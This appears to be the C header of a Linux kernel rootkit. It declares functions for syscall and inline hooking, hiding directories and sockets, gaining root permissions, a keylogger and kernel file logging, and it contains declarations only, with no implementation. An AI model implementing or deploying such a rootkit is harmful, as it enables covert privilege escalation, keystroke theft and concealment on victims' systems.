
#ifndef ROOTKIT_H
#define ROOTKIT_H

// hooking functions 
void hijack_start ( void *target, void *new, unsigned char** o_code);
void hijack_stop ( void *target, unsigned char* o_code);

// hide from ls (filldir)
int hide_directory(void);
int remove_hook(void);

// starting hook on root permissions (inline hook)
void start_root_hook_inline(void);
void stop_root_hook_inline(void);

// starting hook on root permissions (syscall)
void start_root_hook(void);
void stop_root_hook(void);

// socket hiding 
int hide_sock(void);
int remove_sock_hook(void);

// keylogger
int start_key_logger(void);
int stop_key_logger(void);

// logger function 
// open file 
struct file * driver_file_open(const char *path, int flags, int mode);

// close file
void driver_file_close(struct file *filp);

// write to file
int driver_file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);

// read from file 
int driver_file_read(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);

#endif /* ROOTKIT_H */

